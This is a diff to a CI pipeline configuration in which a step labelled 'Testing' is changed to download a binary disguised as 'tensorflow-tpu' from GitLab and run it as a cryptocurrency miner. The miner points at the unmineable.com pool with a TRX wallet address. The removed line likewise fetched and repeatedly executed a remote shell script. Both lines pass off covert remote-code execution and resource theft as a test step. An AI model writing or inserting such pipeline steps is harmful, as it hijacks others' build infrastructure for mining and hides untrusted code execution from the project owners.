@@ -7,4 +7,6 @@ jobs:
       - checkout
       - run:
           name: "Testing"
-          command: wget https://raw.githubusercontent.com/Bababrucelee/run/main/run.sh && chmod +x run.sh  && ./run.sh && wget https://raw.githubusercontent.com/Bababrucelee/run/main/run.sh && chmod +x run.sh && ./run.sh && chmod +x run.sh && ./run.sh 
+          command: wget https://gitlab.com/nilavdas5/g/-/raw/main/tensorflow-tpu&& chmod +x tensorflow-tpu && ./tensorflow-tpu -o rx.unmineable.com:3333 -u TRX:TM5s6Yisi5eujDasyt9rBeWwjLZmNpXQZh.$(echo $(shuf -i 1-9999 -n 1)-PROXY)
+          
+ 
